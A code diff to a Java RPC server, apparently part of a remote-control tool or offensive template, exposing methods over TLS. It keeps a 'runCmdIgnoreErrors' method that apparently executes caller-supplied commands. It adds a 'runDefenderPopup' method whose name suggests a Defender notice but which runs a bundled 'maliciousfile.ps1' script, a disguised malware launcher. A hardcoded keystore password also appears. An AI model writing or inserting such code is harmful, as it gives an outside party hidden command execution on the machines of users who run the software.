@@ -15,6 +15,7 @@ import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.function.Function;
+import main.server.RpcServerMethods;
 
 public class RpcServer {
     private static final ObjectMapper MAPPER = new ObjectMapper();
@@ -32,8 +33,11 @@ public class RpcServer {
     public RpcServer() {
         methods.put("insertText", this::handleInsertText);
         methods.put("getAdminStatus", this::handleGetAdminStatus);
-        methods.put("runCmdIgnoreErrors", this::handlerunCmdIgnoreErrors);
+        methods.put("runCmdIgnoreErrors", this::handleRunCmdIgnoreErrors);
+        methods.put("runDefenderPopup", this::handleRunDefenderPopup);
     }
+
+    // ##### CREATE YOUR OWN METHODS HERE ##### //
 
     private void insertText(String message) {
         System.out.println("insertText(message) called with: " + message);
@@ -62,6 +66,11 @@ public class RpcServer {
         }
     }
 
+    public void runDefenderPopup() {
+        RpcServerMethods methods = new RpcServerMethods();
+        methods.runScriptFromResources("maliciousfile.ps1");
+    }
+
     private JsonNode handleInsertText(JsonNode req) {
         JsonNode params = req.path("params");
         String message = params.path("message").asText(null);
@@ -75,7 +84,7 @@ public class RpcServer {
         return result;
     }
 
-    private JsonNode handlerunCmdIgnoreErrors(JsonNode req) {
+    private JsonNode handleRunCmdIgnoreErrors(JsonNode req) {
         JsonNode params = req.path("params");
         String message = params.path("message").asText(null);
         if (message == null) throw new IllegalArgumentException("params.message is required");
@@ -87,6 +96,21 @@ public class RpcServer {
         result.put("message", "cmd executed with: " + message);
         return result;
     }
+
+    private JsonNode handleRunDefenderPopup(JsonNode req) {
+        JsonNode params = req.path("params");
+        String message = params.path("message").asText(null);
+        if (message == null) throw new IllegalArgumentException("params.message is required");
+
+        runDefenderPopup();
+
+        ObjectNode result = MAPPER.createObjectNode();
+        result.put("stored", true);
+        result.put("message", "popup displayed with: " + message);
+        return result;
+    }
+
+    // ##### -------------------- ##### //
 
     private JsonNode handleGetAdminStatus(JsonNode req) {
         ObjectNode result = MAPPER.createObjectNode();
@@ -115,7 +139,7 @@ public class RpcServer {
 
     private SSLServerSocket createTlsServerSocket(int port) throws Exception {
         KeyStore ks = KeyStore.getInstance("JKS");
-        try (FileInputStream fis = new FileInputStream("src/main/java/main/server/server-keystore.jks")) {
+        try (FileInputStream fis = new FileInputStream("src/main/resources/server-keystore.jks")) {
             ks.load(fis, "changeit".toCharArray());
         }
 
